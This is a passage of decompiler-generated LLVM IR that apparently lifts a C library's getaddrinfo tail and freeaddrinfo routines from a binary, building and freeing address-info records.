  %v1_1001d234 = add i32 %v0_1001d230, 1
  store i32 %v1_1001d234, i32* %r22.global-to-local, align 4
  %v0_1001d238.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d238

dec_label_pc_1001d238:                            ; preds = %dec_label_pc_1001d154, %dec_label_pc_1001d22c
  %v0_1001d26859 = phi i32 [ 0, %dec_label_pc_1001d154 ], [ %v1_1001d234, %dec_label_pc_1001d22c ]
  %v0_1001d238 = phi i32 [ %v0_1001d17c54, %dec_label_pc_1001d154 ], [ %v0_1001d238.pre, %dec_label_pc_1001d22c ]
  %v1_1001d238 = add i32 %v0_1001d238, 4
  %v2_1001d238 = inttoptr i32 %v1_1001d238 to i32*
  %v3_1001d238 = load i32, i32* %v2_1001d238, align 4
  store i32 %v3_1001d238, i32* %r0.global-to-local, align 4
  %v3_1001d23c = icmp eq i32 %v3_1001d238, 10
  br i1 %v3_1001d23c, label %dec_label_pc_1001d254, label %dec_label_pc_1001d244

dec_label_pc_1001d244:                            ; preds = %dec_label_pc_1001d238
  %v0_1001d244 = load i32, i32* @r21, align 4
  %v3_1001d244 = icmp eq i32 %v0_1001d244, 0
  store i32 16, i32* %r23.global-to-local, align 4
  store i32 2, i32* %r24.global-to-local, align 4
  br i1 %v3_1001d244, label %dec_label_pc_1001d25c, label %dec_label_pc_1001d254

dec_label_pc_1001d254:                            ; preds = %dec_label_pc_1001d244, %dec_label_pc_1001d238
  store i32 28, i32* %r23.global-to-local, align 4
  store i32 10, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_1001d25c

dec_label_pc_1001d25c:                            ; preds = %dec_label_pc_1001d244, %dec_label_pc_1001d254
  %v0_1001d26457 = phi i32 [ 16, %dec_label_pc_1001d244 ], [ 28, %dec_label_pc_1001d254 ]
  %v3_1001d25c = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001d25c, i32* @r30, align 4
  %v3_1001d39c11 = icmp eq i32 %v3_1001d25c, 0
  br i1 %v3_1001d39c11, label %dec_label_pc_1001d3a4, label %dec_label_pc_1001d264.preheader

dec_label_pc_1001d264.preheader:                  ; preds = %dec_label_pc_1001d25c
  %v1_1001d26489 = add i32 %v0_1001d26859, 32
  %v2_1001d26890 = add i32 %v1_1001d26489, %v0_1001d26457
  store i32 %v2_1001d26890, i32* @r3, align 4
  store i32 268554864, i32* @lr, align 4
  %v0_1001d26c91 = call i32 @malloc()
  %v3_1001d27094 = icmp eq i32 %v0_1001d26c91, 0
  %v1_1001d27495 = load i32, i32* @r25, align 4
  %v2_1001d27496 = inttoptr i32 %v1_1001d27495 to i32*
  store i32 %v0_1001d26c91, i32* %v2_1001d27496, align 4
  br i1 %v3_1001d27094, label %dec_label_pc_1001d3e4, label %dec_label_pc_1001d27c

dec_label_pc_1001d27c:                            ; preds = %dec_label_pc_1001d264.preheader, %dec_label_pc_1001d384.dec_label_pc_1001d264_crit_edge
  %v0_1001d26c97 = phi i32 [ %v0_1001d26c, %dec_label_pc_1001d384.dec_label_pc_1001d264_crit_edge ], [ %v0_1001d26c91, %dec_label_pc_1001d264.preheader ]
  %v0_1001d27c = load i32, i32* @r27, align 4
  %v1_1001d27c = inttoptr i32 %v0_1001d27c to i32*
  %v2_1001d27c = load i32, i32* %v1_1001d27c, align 4
  store i32 %v2_1001d27c, i32* %r0.global-to-local, align 4
  %v0_1001d280 = load i32, i32* %r24.global-to-local, align 4
  %v3_1001d280 = icmp eq i32 %v0_1001d280, 10
  %v2_1001d284 = inttoptr i32 %v0_1001d26c97 to i32*
  store i32 %v2_1001d27c, i32* %v2_1001d284, align 4
  %v0_1001d288 = load i32, i32* @r25, align 4
  %v1_1001d288 = inttoptr i32 %v0_1001d288 to i32*
  %v2_1001d288 = load i32, i32* %v1_1001d288, align 4
  store i32 %v2_1001d288, i32* %r9.global-to-local, align 4
  %v0_1001d28c = load i32, i32* %r24.global-to-local, align 4
  %v2_1001d28c = add i32 %v2_1001d288, 4
  %v3_1001d28c = inttoptr i32 %v2_1001d28c to i32*
  store i32 %v0_1001d28c, i32* %v3_1001d28c, align 4
  %v0_1001d290 = load i32, i32* @r25, align 4
  %v1_1001d290 = inttoptr i32 %v0_1001d290 to i32*
  %v2_1001d290 = load i32, i32* %v1_1001d290, align 4
  store i32 %v2_1001d290, i32* %r9.global-to-local, align 4
  %v0_1001d294 = load i32, i32* @r30, align 4
  %v1_1001d294 = add i32 %v0_1001d294, 4
  %v2_1001d294 = inttoptr i32 %v1_1001d294 to i32*
  %v3_1001d294 = load i32, i32* %v2_1001d294, align 4
  store i32 %v3_1001d294, i32* %r0.global-to-local, align 4
  %v2_1001d298 = add i32 %v2_1001d290, 8
  %v3_1001d298 = inttoptr i32 %v2_1001d298 to i32*
  store i32 %v3_1001d294, i32* %v3_1001d298, align 4
  %v0_1001d29c = load i32, i32* @r25, align 4
  %v1_1001d29c = inttoptr i32 %v0_1001d29c to i32*
  %v2_1001d29c = load i32, i32* %v1_1001d29c, align 4
  store i32 %v2_1001d29c, i32* %r9.global-to-local, align 4
  %v0_1001d2a0 = load i32, i32* @r30, align 4
  %v1_1001d2a0 = add i32 %v0_1001d2a0, 8
  %v2_1001d2a0 = inttoptr i32 %v1_1001d2a0 to i32*
  %v3_1001d2a0 = load i32, i32* %v2_1001d2a0, align 4
  store i32 %v3_1001d2a0, i32* %r0.global-to-local, align 4
  %v2_1001d2a4 = add i32 %v2_1001d29c, 12
  %v3_1001d2a4 = inttoptr i32 %v2_1001d2a4 to i32*
  store i32 %v3_1001d2a0, i32* %v3_1001d2a4, align 4
  %v0_1001d2a8 = load i32, i32* @r25, align 4
  %v1_1001d2a8 = inttoptr i32 %v0_1001d2a8 to i32*
  %v2_1001d2a8 = load i32, i32* %v1_1001d2a8, align 4
  store i32 %v2_1001d2a8, i32* %r9.global-to-local, align 4
  %v0_1001d2ac = load i32, i32* %r23.global-to-local, align 4
  %v2_1001d2ac = add i32 %v2_1001d2a8, 16
  %v3_1001d2ac = inttoptr i32 %v2_1001d2ac to i32*
  store i32 %v0_1001d2ac, i32* %v3_1001d2ac, align 4
  %v0_1001d2b0 = load i32, i32* @r25, align 4
  %v1_1001d2b0 = inttoptr i32 %v0_1001d2b0 to i32*
  %v2_1001d2b0 = load i32, i32* %v1_1001d2b0, align 4
  store i32 %v2_1001d2b0, i32* %r9.global-to-local, align 4
  %v1_1001d2b4 = add i32 %v2_1001d2b0, 32
  store i32 %v1_1001d2b4, i32* %r0.global-to-local, align 4
  %v2_1001d2b8 = add i32 %v2_1001d2b0, 20
  %v3_1001d2b8 = inttoptr i32 %v2_1001d2b8 to i32*
  store i32 %v1_1001d2b4, i32* %v3_1001d2b8, align 4
  %v0_1001d2bc = load i32, i32* @r25, align 4
  %v1_1001d2bc = inttoptr i32 %v0_1001d2bc to i32*
  %v2_1001d2bc = load i32, i32* %v1_1001d2bc, align 4
  store i32 %v2_1001d2bc, i32* %r9.global-to-local, align 4
  %v1_1001d2c0 = add i32 %v2_1001d2bc, 20
  %v2_1001d2c0 = inttoptr i32 %v1_1001d2c0 to i32*
  %v3_1001d2c0 = load i32, i32* %v2_1001d2c0, align 4
  store i32 %v3_1001d2c0, i32* %r9.global-to-local, align 4
  %v0_1001d2c4 = load i32, i32* %r24.global-to-local, align 4
  %v1_1001d2c4 = trunc i32 %v0_1001d2c4 to i16
  %v3_1001d2c4 = inttoptr i32 %v3_1001d2c0 to i16*
  store i16 %v1_1001d2c4, i16* %v3_1001d2c4, align 2
  %v0_1001d2c8 = load i32, i32* @r25, align 4
  %v1_1001d2c8 = inttoptr i32 %v0_1001d2c8 to i32*
  %v2_1001d2c8 = load i32, i32* %v1_1001d2c8, align 4
  %v1_1001d2d0 = add i32 %v2_1001d2c8, 20
  %v2_1001d2d0 = inttoptr i32 %v1_1001d2d0 to i32*
  %v3_1001d2d0 = load i32, i32* %v2_1001d2d0, align 4
  store i32 %v3_1001d2d0, i32* %r29.global-to-local, align 4
  br i1 %v3_1001d280, label %dec_label_pc_1001d2d0, label %dec_label_pc_1001d328

dec_label_pc_1001d2d0:                            ; preds = %dec_label_pc_1001d27c
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_1001d2d8 = load i32, i32* @r28, align 4
  %v1_1001d2d8 = add i32 %v0_1001d2d8, 8
  store i32 %v1_1001d2d8, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  %v2_1001d2e0 = add i32 %v3_1001d2d0, 4
  %v3_1001d2e0 = inttoptr i32 %v2_1001d2e0 to i32*
  store i32 0, i32* %v3_1001d2e0, align 4
  %v0_1001d2e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d2e4 = add i32 %v0_1001d2e4, 8
  store i32 %v1_1001d2e4, i32* @r3, align 4
  %v0_1001d2e8 = load i32, i32* @r28, align 4
  %v1_1001d2e8 = add i32 %v0_1001d2e8, 4
  %v2_1001d2e8 = inttoptr i32 %v1_1001d2e8 to i32*
  %v3_1001d2e8 = load i32, i32* %v2_1001d2e8, align 4
  store i32 %v3_1001d2e8, i32* %r0.global-to-local, align 4
  %v3_1001d2ec = icmp eq i32 %v3_1001d2e8, 10
  br i1 %v3_1001d2ec, label %dec_label_pc_1001d310, label %dec_label_pc_1001d2f4

dec_label_pc_1001d2f4:                            ; preds = %dec_label_pc_1001d2d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001d2f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001d2f8 = add i32 %v0_1001d2e4, 12
  %v3_1001d2f8 = inttoptr i32 %v2_1001d2f8 to i32*
  store i32 %v0_1001d2f8, i32* %v3_1001d2f8, align 4
  %v0_1001d2fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d2fc = or i32 %v0_1001d2fc, 65535
  store i32 %v1_1001d2fc, i32* %r0.global-to-local, align 4
  %v0_1001d300 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d300 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d300 = add i32 %v1_1001d300, 8
  %v3_1001d300 = inttoptr i32 %v2_1001d300 to i32*
  store i32 %v0_1001d300, i32* %v3_1001d300, align 4
  %v0_1001d304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d304 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d304 = add i32 %v1_1001d304, 16
  %v3_1001d304 = inttoptr i32 %v2_1001d304 to i32*
  store i32 %v0_1001d304, i32* %v3_1001d304, align 4
  %v0_1001d308 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d308 = add i32 %v0_1001d308, 20
  store i32 %v1_1001d308, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  br label %dec_label_pc_1001d310

dec_label_pc_1001d310:                            ; preds = %dec_label_pc_1001d2d0, %dec_label_pc_1001d2f4
  store i32 268555028, i32* @lr, align 4
  %v0_1001d310 = call i32 @memcpy()
  %v0_1001d314 = load i32, i32* @r30, align 4
  %v1_1001d314 = add i32 %v0_1001d314, 12
  %v2_1001d314 = inttoptr i32 %v1_1001d314 to i32*
  %v3_1001d314 = load i32, i32* %v2_1001d314, align 4
  store i32 %v3_1001d314, i32* %r0.global-to-local, align 4
  %v1_1001d318 = trunc i32 %v3_1001d314 to i16
  %v2_1001d318 = load i32, i32* %r29.global-to-local, align 4
  %v3_1001d318 = add i32 %v2_1001d318, 2
  %v4_1001d318 = inttoptr i32 %v3_1001d318 to i16*
  store i16 %v1_1001d318, i16* %v4_1001d318, align 2
  %v0_1001d31c = load i32, i32* @r28, align 4
  %v1_1001d31c = add i32 %v0_1001d31c, 24
  %v2_1001d31c = inttoptr i32 %v1_1001d31c to i32*
  %v3_1001d31c = load i32, i32* %v2_1001d31c, align 4
  store i32 %v3_1001d31c, i32* %r0.global-to-local, align 4
  %v1_1001d320 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d320 = add i32 %v1_1001d320, 24
  %v3_1001d320 = inttoptr i32 %v2_1001d320 to i32*
  store i32 %v3_1001d31c, i32* %v3_1001d320, align 4
  br label %dec_label_pc_1001d354

dec_label_pc_1001d328:                            ; preds = %dec_label_pc_1001d27c
  %v0_1001d32c = load i32, i32* @r28, align 4
  %v1_1001d32c = add i32 %v0_1001d32c, 8
  store i32 %v1_1001d32c, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v1_1001d334 = add i32 %v3_1001d2d0, 4
  store i32 %v1_1001d334, i32* @r3, align 4
  store i32 268555068, i32* @lr, align 4
  %v0_1001d338 = call i32 @memcpy()
  %v0_1001d33c = load i32, i32* @r30, align 4
  %v1_1001d33c = add i32 %v0_1001d33c, 12
  %v2_1001d33c = inttoptr i32 %v1_1001d33c to i32*
  %v3_1001d33c = load i32, i32* %v2_1001d33c, align 4
  store i32 %v3_1001d33c, i32* %r0.global-to-local, align 4
  %v0_1001d340 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d340 = add i32 %v0_1001d340, 8
  store i32 %v1_1001d340, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  %v1_1001d34c = trunc i32 %v3_1001d33c to i16
  %v3_1001d34c = add i32 %v0_1001d340, 2
  %v4_1001d34c = inttoptr i32 %v3_1001d34c to i16*
  store i16 %v1_1001d34c, i16* %v4_1001d34c, align 2
  store i32 268555092, i32* @lr, align 4
  %v0_1001d350 = call i32 @__GI_memset()
  br label %dec_label_pc_1001d354

dec_label_pc_1001d354:                            ; preds = %dec_label_pc_1001d310, %dec_label_pc_1001d328
  %v0_1001d354 = load i32, i32* @r26, align 4
  %v3_1001d354 = icmp eq i32 %v0_1001d354, 0
  %v0_1001d358 = load i32, i32* @r25, align 4
  %v1_1001d358 = inttoptr i32 %v0_1001d358 to i32*
  %v2_1001d358 = load i32, i32* %v1_1001d358, align 4
  br i1 %v3_1001d354, label %dec_label_pc_1001d380, label %dec_label_pc_1001d360

dec_label_pc_1001d360:                            ; preds = %dec_label_pc_1001d354
  %v1_1001d360 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1001d354, i32* %r4.global-to-local, align 4
  %v2_1001d360 = add i32 %v2_1001d358, 32
  %v1_1001d368 = add i32 %v2_1001d360, %v1_1001d360
  store i32 %v1_1001d368, i32* %r9.global-to-local, align 4
  %v2_1001d36c = add i32 %v2_1001d358, 24
  %v3_1001d36c = inttoptr i32 %v2_1001d36c to i32*
  store i32 %v1_1001d368, i32* %v3_1001d36c, align 4
  %v0_1001d370 = load i32, i32* @r25, align 4
  %v1_1001d370 = inttoptr i32 %v0_1001d370 to i32*
  %v2_1001d370 = load i32, i32* %v1_1001d370, align 4
  store i32 %v2_1001d370, i32* %r9.global-to-local, align 4
  %v1_1001d374 = add i32 %v2_1001d370, 24
  %v2_1001d374 = inttoptr i32 %v1_1001d374 to i32*
  %v3_1001d374 = load i32, i32* %v2_1001d374, align 4
  %v2_1001d378 = inttoptr i32 %v0_1001d354 to i8*
  %v3_1001d378 = call i32 @strcpy(i32 %v3_1001d374, i8* %v2_1001d378)
  br label %dec_label_pc_1001d384

dec_label_pc_1001d380:                            ; preds = %dec_label_pc_1001d354
  %v2_1001d380 = add i32 %v2_1001d358, 24
  %v3_1001d380 = inttoptr i32 %v2_1001d380 to i32*
  store i32 0, i32* %v3_1001d380, align 4
  br label %dec_label_pc_1001d384

dec_label_pc_1001d384:                            ; preds = %dec_label_pc_1001d360, %dec_label_pc_1001d380
  %v0_1001d384 = load i32, i32* @r25, align 4
  %v1_1001d384 = inttoptr i32 %v0_1001d384 to i32*
  %v2_1001d384 = load i32, i32* %v1_1001d384, align 4
  store i32 %v2_1001d384, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001d38c = add i32 %v2_1001d384, 28
  %v3_1001d38c = inttoptr i32 %v2_1001d38c to i32*
  store i32 0, i32* %v3_1001d38c, align 4
  %v0_1001d390 = load i32, i32* @r25, align 4
  %v1_1001d390 = inttoptr i32 %v0_1001d390 to i32*
  %v2_1001d390 = load i32, i32* %v1_1001d390, align 4
  store i32 %v2_1001d390, i32* %r9.global-to-local, align 4
  %v0_1001d394 = load i32, i32* @r30, align 4
  %v1_1001d394 = inttoptr i32 %v0_1001d394 to i32*
  %v2_1001d394 = load i32, i32* %v1_1001d394, align 4
  store i32 %v2_1001d394, i32* @r30, align 4
  %v1_1001d398 = add i32 %v2_1001d390, 28
  store i32 %v1_1001d398, i32* @r25, align 4
  %v3_1001d39c = icmp eq i32 %v2_1001d394, 0
  br i1 %v3_1001d39c, label %dec_label_pc_1001d39c.dec_label_pc_1001d3a4_crit_edge, label %dec_label_pc_1001d384.dec_label_pc_1001d264_crit_edge

dec_label_pc_1001d384.dec_label_pc_1001d264_crit_edge: ; preds = %dec_label_pc_1001d384
  %v0_1001d264.pre = load i32, i32* %r23.global-to-local, align 4
  %v0_1001d268.pre = load i32, i32* %r22.global-to-local, align 4
  %v1_1001d264 = add i32 %v0_1001d268.pre, 32
  %v2_1001d268 = add i32 %v1_1001d264, %v0_1001d264.pre
  store i32 %v2_1001d268, i32* @r3, align 4
  store i32 268554864, i32* @lr, align 4
  %v0_1001d26c = call i32 @malloc()
  %v3_1001d270 = icmp eq i32 %v0_1001d26c, 0
  %v1_1001d274 = load i32, i32* @r25, align 4
  %v2_1001d274 = inttoptr i32 %v1_1001d274 to i32*
  store i32 %v0_1001d26c, i32* %v2_1001d274, align 4
  br i1 %v3_1001d270, label %dec_label_pc_1001d3e4, label %dec_label_pc_1001d27c

dec_label_pc_1001d39c.dec_label_pc_1001d3a4_crit_edge: ; preds = %dec_label_pc_1001d384
  %v0_1001d3a4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d3a4

dec_label_pc_1001d3a4:                            ; preds = %dec_label_pc_1001d39c.dec_label_pc_1001d3a4_crit_edge, %dec_label_pc_1001d25c
  %v0_1001d3a4 = phi i32 [ %v0_1001d3a4.pre, %dec_label_pc_1001d39c.dec_label_pc_1001d3a4_crit_edge ], [ %v0_1001d238, %dec_label_pc_1001d25c ]
  %v1_1001d3a4 = inttoptr i32 %v0_1001d3a4 to i32*
  %v2_1001d3a4 = load i32, i32* %v1_1001d3a4, align 4
  store i32 %v2_1001d3a4, i32* @r28, align 4
  %v3_1001d3a8 = icmp eq i32 %v2_1001d3a4, 0
  br i1 %v3_1001d3a8, label %dec_label_pc_1001d3ec, label %dec_label_pc_1001d154

dec_label_pc_1001d3b4:                            ; preds = %dec_label_pc_1001ca84, %dec_label_pc_1001c968, %dec_label_pc_1001c98c
  store i32 264, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3bc:                            ; preds = %dec_label_pc_1001ccb0, %dec_label_pc_1001cc18
  store i32 6, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3c4:                            ; preds = %dec_label_pc_1001d224, %dec_label_pc_1001d050, %dec_label_pc_1001cd1c
  store i32 258, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3cc:                            ; preds = %dec_label_pc_1001d040, %dec_label_pc_1001d038
  store i32 259, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3d4:                            ; preds = %dec_label_pc_1001d1ec
  %v0_1001d3d4 = call i32 @__GI___h_errno_location()
  store i32 11, i32* %r9.global-to-local, align 4
  %v0_1001d3dc = load i32, i32* @r30, align 4
  %v2_1001d3dc = inttoptr i32 %v0_1001d3d4 to i32*
  store i32 %v0_1001d3dc, i32* %v2_1001d3dc, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3e4:                            ; preds = %dec_label_pc_1001d384.dec_label_pc_1001d264_crit_edge, %dec_label_pc_1001d264.preheader
  store i32 10, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3ec:                            ; preds = %dec_label_pc_1001d3a4, %dec_label_pc_1001d148, %dec_label_pc_1001d140
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f0

dec_label_pc_1001d3f0:                            ; preds = %dec_label_pc_1001ca60, %dec_label_pc_1001c9b8, %dec_label_pc_1001c968, %dec_label_pc_1001d040, %dec_label_pc_1001d3e4, %dec_label_pc_1001d3d4, %dec_label_pc_1001d3cc, %dec_label_pc_1001d3c4, %dec_label_pc_1001d3bc, %dec_label_pc_1001d3b4, %dec_label_pc_1001cf64, %dec_label_pc_1001d3ec
  %v2_1001d3f0 = load i32, i32* %stack_var_-176, align 4
  store i32 %v2_1001d3f0, i32* %r11.global-to-local, align 4
  %v0_1001d3f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d3f8 = add i32 %v2_1001d3f0, 4
  %v2_1001d3f8 = inttoptr i32 %v1_1001d3f8 to i32*
  %v3_1001d3f8 = load i32, i32* %v2_1001d3f8, align 4
  store i32 %v3_1001d3f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001d3f4

; uselistorder directives
  uselistorder i32 %v2_1001d3a4, { 1, 2, 0 }
  uselistorder i32 %v0_1001d26c, { 1, 2, 0 }
  uselistorder i32 %v2_1001d358, { 2, 1, 0 }
  uselistorder i32 %v0_1001d354, { 1, 0, 2 }
  uselistorder i32 %v1_1001d170, { 1, 0 }
  uselistorder i32 %v1_1001d12c, { 1, 0 }
  uselistorder i32 %v1_1001d0e4, { 1, 0 }
  uselistorder i32 %v1_1001d004, { 1, 0 }
  uselistorder i32 %v0_1001d004, { 1, 0 }
  uselistorder i32 %v0_1001cf80, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1001cefc, { 1, 0 }
  uselistorder i32 %v0_1001d024, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1001ce9c, { 1, 0 }
  uselistorder i32 %v0_1001ce9c, { 1, 0 }
  uselistorder i32 %v0_1001ce3c, { 1, 0 }
  uselistorder i32 %v0_1001ce08, { 0, 2, 1 }
  uselistorder i32 %v1_1001cd88, { 1, 0 }
  uselistorder i32 %v0_1001cba8, { 1, 0 }
  uselistorder i32 %v1_1001cb8c, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_1001cb78, { 0, 2, 1 }
  uselistorder i32 %v1_1001ca74, { 1, 0 }
  uselistorder i32 %v1_1001ca4c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1001cb5c, { 2, 1, 3, 4, 0, 6, 5, 7 }
  uselistorder i32 %v3_1001c968, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_1001c910, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i1 %v3_1001c8ec, { 1, 0, 2 }
  uselistorder i32 %v2_1001c898, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-176, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %stack_var_-168, { 0, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10 }
  uselistorder i32* %stack_var_-185, { 0, 1, 2, 4, 3 }
  uselistorder i32* %stack_var_-256, { 0, 2, 3, 4, 1 }
  uselistorder i8** %stack_var_-156, { 12, 11, 5, 0, 10, 9, 4, 1, 8, 7, 3, 6, 2 }
  uselistorder i32* %stack_var_-164, { 0, 1, 2, 3, 4, 5, 6, 7, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %stack_var_-160, { 2, 3, 6, 0, 4, 7, 1, 5, 8 }
  uselistorder i32* %r9.global-to-local, { 82, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 32, 33, 34, 35, 36, 39, 40, 41, 42, 48, 49, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 1, 2, 0, 3, 5, 4, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r23.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32* %r22.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 53, 114, 39, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 51, 48, 49, 50, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 0, 86, 82, 81, 83, 84, 85, 88, 87, 89, 90, 91, 99, 92, 93, 94, 95, 96, 97, 98, 100, 101, 102, 1, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113 }
  uselistorder i32 264, { 1, 0, 2 }
  uselistorder i32 268554864, { 1, 0 }
  uselistorder i32 -25, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @gethostbyname2_r, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 37, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32)* @gaih_inet_serv, { 1, 0 }
  uselistorder label %dec_label_pc_1001d3f0, { 11, 4, 5, 6, 7, 8, 9, 3, 10, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001d3b4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d384, { 1, 0 }
  uselistorder label %dec_label_pc_1001d354, { 1, 0 }
  uselistorder label %dec_label_pc_1001d310, { 1, 0 }
  uselistorder label %dec_label_pc_1001d27c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d25c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d238, { 1, 0 }
  uselistorder label %dec_label_pc_1001d224, { 1, 0 }
  uselistorder label %dec_label_pc_1001d1e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d154, { 1, 0 }
  uselistorder label %dec_label_pc_1001d140, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001d10c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d104, { 1, 0 }
  uselistorder label %dec_label_pc_1001d0c0, { 1, 0 }
  uselistorder label %dec_label_pc_1001d050, { 5, 6, 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1001d040, { 1, 0 }
  uselistorder label %dec_label_pc_1001d000, { 1, 0 }
  uselistorder label %dec_label_pc_1001cfcc, { 1, 0 }
  uselistorder label %dec_label_pc_1001cf58, { 1, 0 }
  uselistorder label %dec_label_pc_1001cebc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001ce98, { 1, 0 }
  uselistorder label %dec_label_pc_1001ce64, { 1, 0 }
  uselistorder label %dec_label_pc_1001cde4, { 1, 0 }
  uselistorder label %dec_label_pc_1001cd44, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1001cc88, { 1, 0 }
  uselistorder label %dec_label_pc_1001cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_1001cbb4, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1001cb6c, { 1, 0 }
  uselistorder label %dec_label_pc_1001cb50, { 1, 0 }
  uselistorder label %dec_label_pc_1001cb48, { 1, 0 }
  uselistorder label %dec_label_pc_1001cb00, { 1, 0 }
  uselistorder label %dec_label_pc_1001cae0, { 1, 0 }
  uselistorder label %dec_label_pc_1001ca74, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1001c9e8, { 1, 0 }
  uselistorder label %dec_label_pc_1001c984, { 1, 0 }
  uselistorder label %dec_label_pc_1001c914, { 1, 0 }
  uselistorder label %dec_label_pc_1001c8f4, { 1, 0 }
  uselistorder label %dec_label_pc_1001c8d8, { 1, 0 }
}

define i32 @freeaddrinfo(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1001d42c3 = icmp eq i32 %arg1, 0
  store i32 %arg1, i32* @r3, align 4
  br i1 %v3_1001d42c3, label %dec_label_pc_1001d438, label %dec_label_pc_1001d424

dec_label_pc_1001d424:                            ; preds = %entry, %dec_label_pc_1001d424
  %v0_1001d424 = phi i32 [ %v0_1001d42c.pr, %dec_label_pc_1001d424 ], [ %arg1, %entry ]
  %v1_1001d424 = add i32 %v0_1001d424, 28
  %v2_1001d424 = inttoptr i32 %v1_1001d424 to i32*
  %v3_1001d424 = load i32, i32* %v2_1001d424, align 4
  store i32 %v3_1001d424, i32* @r29, align 4
  store i32 268555308, i32* @lr, align 4
  %v0_1001d428 = call i32 @free()
  %v0_1001d42c.pr = load i32, i32* @r29, align 4
  %v3_1001d42c = icmp eq i32 %v0_1001d42c.pr, 0
  store i32 %v0_1001d42c.pr, i32* @r3, align 4
  br i1 %v3_1001d42c, label %dec_label_pc_1001d438, label %dec_label_pc_1001d424

dec_label_pc_1001d438:                            ; preds = %dec_label_pc_1001d424, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001d42c.pr, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001d424, { 1, 0 }
}

